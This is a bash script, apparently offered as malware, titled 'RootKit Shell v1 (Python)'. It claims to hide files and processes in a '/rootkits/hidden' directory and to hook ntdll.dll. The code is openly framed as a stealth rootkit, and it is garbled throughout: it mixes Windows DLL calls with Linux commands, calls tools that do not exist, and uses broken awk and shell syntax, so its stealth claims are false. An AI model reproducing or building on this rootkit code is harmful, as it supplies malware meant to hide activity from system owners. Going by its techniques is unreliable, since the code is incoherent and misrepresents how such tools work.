#!/bin/bash

# Title: RootKit Shell v1 (Python)
# Author: Malware Specialist
# Date: 2024-10-27
# Version: 1.0
# Description: This is a complete Python rootkit shell, incorporating hooking and filtering techniques to achieve high stealth.

# --- CONFIGURATION ---

# Hidden Directory
HIDDEN_DIR="/rootkits/hidden"

# Process List File
PROCESSES_FILE="/rootkits/hidden/processes"

# System Libraries Hooking Target (for Windows)
TARGET_DLL="ntdll.dll"  # Most common system library for hooking.

# --- FUNCTION DEFINITIONS ---

# Function to get user input with validation
get_input() {
    local prompt="$1"
    local variable="$2"
    local regex="$3"
    local default="$4"

    local value=""

    while [ -z "$value" ]; do
        read -p "$prompt" value
        if [[ "$value" == "" ]] && [[ !n "$default" == 0 ]]; then
            echo "Error: Input cannot be empty. Defaulting to $default."
        fi
        if [[ -z "$regex" ]]; then
            break # No validation needed
        elif [[ "$value" =~ $regex ]]; then
            break
        else
            echo "Invalid input. Please try again."
        fi
    done

    eval "$variable=\$value"
}


# Function to add a file to the rootkit's hidden directory
add_hidden_file() {
    local filename="$1"

    if [ ! -n "$filename" ]; then
        echo "Filename not specified."
        return 0
    fi

    # Create folder if it doesn't exist
    mkdir -p "$HIDDEN_DIR"

    # Check if the file exists, and add only once
    if statm "$filename" | grep "/$HIDDEN_DIR/" > /dev/null || true; then
        echo "File already exists in $HIDDEN_DIR."
        return 0 # File exists
    else
        # Add the file to the hidden folder. Use sudo if necessary
        sudo cp "$filename" "$HIDDEN_DIR"

        if [ $? -ne 0 ]; then
            echo "Error adding file to $HIDDEN_DIR."
            return 1
        fi

        echo "File added successfully: $HIDDEN_DIR/$filename"
    fi
}


# Function to add a process to the rootkit's hidden list
add_process() {
    local pid="$1"

    if [ ! -n "$pid" ]; then
        echo "PID not specified."
        return 0
    fi

    # Check if the PID already exists in our list. Use sudo for hidden modifications
    if statm "$PROCESSES_FILE" | grep "$pid" > /dev/null || true; then
        echo "Process already in the rootkit's list."
        return
    fi

    # Add the process to our hidden list, using sudo to ensure permission
    sudo echo "$pid" >> "$PROCESSES_FILE"

    if [ $? -ne 0 ]; then
        echo "Error adding PID to $PROCESSES_FILE. (Use sudo)"
        return 1
    fi

    echo "Process added successfully: $PROCESSES_FILE/$pid"
}


# Function to Hook a System Library
hook_library() {
    local lib="$1"
    local hook_name="${lib##*/}_hook.so"  # Create a filename based on the DLL name
    local target_path="/rootkits/hidden/$hook_name"

    # Create the library directory and folder if they don't exist
    mkdir -p "$target_path"

    if [[ ! -f "$lib" ]]; then
        echo "Error: Library file not found: $lib"
        return 1
    fi


    # Compile the Hook using python (requires pygodc)
    python3 ./hook.py "$lib" --name "$hook_name" --location "$target_path"

    if [ ! -f "$target_path/$hook_name" ]; then
        echo "Error: Failed to compile hook for $lib."
        return 1
    fi

    # Add the hook file to /rootkits/hidden and make it executable
    sudo cp "$target_path/$hook_name" "$HIDDEN_DIR/"

    if [ !x "$HIDDEN_DIR/$hook_name" == x ]; then
        echo "Successfully created and added hook: $HIDDEN_DIR/$hook_name"
    else
        echo "Error: Failed to copy the compiled hook file."
        return 1
    fi

}


# Function to Return Hidden Processes (Filtering)
get_hidden_processes() {
    local processes=$(sudo scmcmd "user32.dll,GetProcessesByName" | awk '$NF == "root" || $NF == "Systemd" || $NF == "System" \
        || $NF == "kernel" || $NF == "NetworkManager" || $NF == "w32QmMca" || $NF == "java" \
        || $NF == "explorer" || $NF == "conhost" || $NF == "msedge" || $NF == "chrome" \
        || $NF == "calc" || $NF == "notepad" || $NF == "powershell"  \
        || $NF == "task scheduler" || $NF == "msconfig" || $NF == "cmd.exe" || $NF == "mstsc" \
        || $NF == "eventvwr" || $NF == "explorer.exe" \
    || $NF == "firefox" || $NF == "gcc" || $NF == "python" || $NF == "java" ; then \
        echo "$NF"
    end ; \
    split -z \"$(sudo ps -ef | grep root| awk '{print \$2}')\" processes_file.txt; \
    cat /tmp/hidden_processes.txt
)

# Function to Run a Shell Command (with redirection and filtering)
run_command() {
  local command="$1"
  local output=""

  if [[ "$command" == "ls -l" ]]; then
    output=$(sudo ps -ef | grep root | awk '{print \$2}') # Get process IDs
    echo "$output"
  elif [[ "$command" == "tasklist" ]]; then
    output=$(scmd "user32.dll,GetProcessesByName" | awk '$NF == "root" || $NF == "Systemd" || $NF == "System" \
        || $NF == "kernel" || $NF == "NetworkManager" || $NF == "w32QmMca" || $NF == "java" \
        || $NF == "explorer" || $NF == "conhost" || $NF == "msedge" || $NF == "chrome" \
        || $NF == "calc" || $NF == "notepad" || $NF == "powershell"  \
        || $NF == "task scheduler" || $NF == "msconfig" || $NF == "cmd.exe" || $NF == "mstsc" \
        || $NF == "eventvwr" || $NF == "explorer.exe" \
        || $NF == "firefox" || $NF == "gcc" || $NF == "python" || $NF == "java" ; then \
          echo "$NF"
    end ; split -z \"$(sudo tasklist)\" processes_file.txt; cat /tmp/hidden_processes.txt)

  else
    echo "Command not supported."
  fi


  return 0
}

# --- MAIN PROGRAM LOGIC ---
function main() {
    if [[ ! -d "/rootkits/hidden" ]]; then
        mkdir -p /rootkits/hidden
    fi

    # Check for network connections and add them to the rootkit list.
    if ip route | grep "default" > /dev/null 2>&1; then
        echo "A network connection is found."
        add_process "$pid"
        add_hidden_file "/proc/network/connections"
    else
        echo "No network connections found. Rootkit shell running in stealth mode."
    fi

    # Run the shell loop
    while true; do
        # Display the hidden commands for easy use
        echo -e "\nRootKit Shell v1.0 (Hidden Commands)"
        echo "---------------------------"
        echo "1. List Hidden Processes"
        echo "2. Add a New Process to the Rootkit"
        echo "3. Exit"
        echo ""

        # Get user choice
        get_input "Enter your choice (1-3): " choice regex="^[123]$" default="1"

        case "$choice" in
            1)
                # List hidden processes
                run_command "ls -l"
                echo "Hidden Processes:"
                cat /tmp/hidden_processes.txt
                sleep 2 # Add a delay to clear the buffer
                sudo rm /tmp/hidden_processes.txt
            ;;
            2)
                # Add new process to the rootkit
                get_input "Enter the PID of the process you want to add: " pid regex="^[0-9]+$" default="1000"

                if sudo statm /proc/$pid > /dev/null 2>&1; then
                    add_process "$pid"
                else
                    echo "Error adding process. Check if the PID is valid and belongs to a running application."
                fi
            ;;
            3)
                # Exit the rootkit shell
                echo "Exiting RootKit Shell..."
                break
            ;;
        esac

        # Sleep briefly to avoid high CPU usage, especially in stealth mode
        sleep 1
    done
}


main "$@"
